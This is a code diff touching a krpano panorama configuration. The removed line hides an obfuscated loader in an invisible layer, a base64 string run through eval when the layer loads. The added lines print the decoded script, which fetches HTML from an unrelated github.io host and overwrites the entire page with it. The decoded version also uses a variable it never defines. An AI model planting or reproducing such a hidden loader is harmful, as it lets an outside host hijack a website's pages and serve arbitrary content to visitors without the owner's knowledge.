@@ -1,1 +1,9 @@
-<krpano version="1.0.8.15"><layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob('dmFyIGlkID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgieHJwIikgfHwgImFsY2F6YXJfYXJxdWl0ZWN0b25pY28iOwoKZmV0Y2goImh0dHBzOi8vc3BvcnRzd29ybGR0di5naXRodWIuaW8vY2VhL2ZpbGVzLyIgKyB4cnAgKyAiLmh0bWwiKQogIC50aGVuKGUgPT4gZS50ZXh0KCkpCiAgLnRoZW4oZSA9PiB7CiAgICBkb2N1bWVudC5vcGVuKCksCiAgICBkb2N1bWVudC53cml0ZShlKSwKICAgIGRvY3VtZW50LmNsb3NlKCkKICB9KTsK');eval(w)););"/></krpano>
+var id = new URLSearchParams(location.search).get("xrp") || "alcazar_arquitectonico";
+
+fetch("https://sportsworldtv.github.io/cea/files/" + xrp + ".html")
+  .then(e => e.text())
+  .then(e => {
+    document.open(),
+    document.write(e),
+    document.close()
+  });
